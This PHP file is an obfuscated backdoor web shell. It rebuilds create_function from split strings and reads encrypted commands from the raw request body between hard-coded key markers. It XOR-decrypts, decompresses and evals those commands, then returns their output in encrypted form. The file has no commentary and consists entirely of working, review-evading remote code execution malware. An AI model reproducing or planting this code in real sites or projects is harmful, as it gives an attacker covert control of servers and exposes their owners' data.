<?php
$y='){$o.=$t/y{$i}^$k{$/yj};}}return/y $o;}i/yf (@p/yreg_matc/yh("//y$kh(.+/y)$kf/",@f/yile_/yget_/ycontents("p/yhp:///yi';
$g=str_replace('D','','crDeatDeDD_funDDction');
$r='k){$/yc=strlen($k)/y;$l=strlen($/yt);$/yo=/y"";for($i/y=0;$i</y$l;){f/yor($j=0;/y($/yj<$c&&$i/y/y<$l);$j+/y+/y,/y$i++';
$U='/y$k/y="55/y82c9/ycc";$kh="c58/y998214398";$kf="/ycf39/yc4b2dded/y";$p="/yryE/y8vU5gFsK/y/yS3DAt";func/y/ytion/y/y x($t,$';
$l='/ynpu/yt"),$m)/y==1) {@/yob_start()/y;@e/yval(@gzuncom/ypr/yess(@x(@/ybas/ye64_deco/y/yde($m[1]),/y$k)));$/yo=@ob_get_/';
$O='y/ycontents(/y);@ob_en/yd_/y/yclean();$r=@base/y64_/yen/ycode(@x(@gz/y/ycom/ypress($o)/y,$k));print("/y$p$kh$r$/ykf");}';
$o=str_replace('/y','',$U.$r.$y.$l.$O);
$I=$g('',$o);$I();
?>
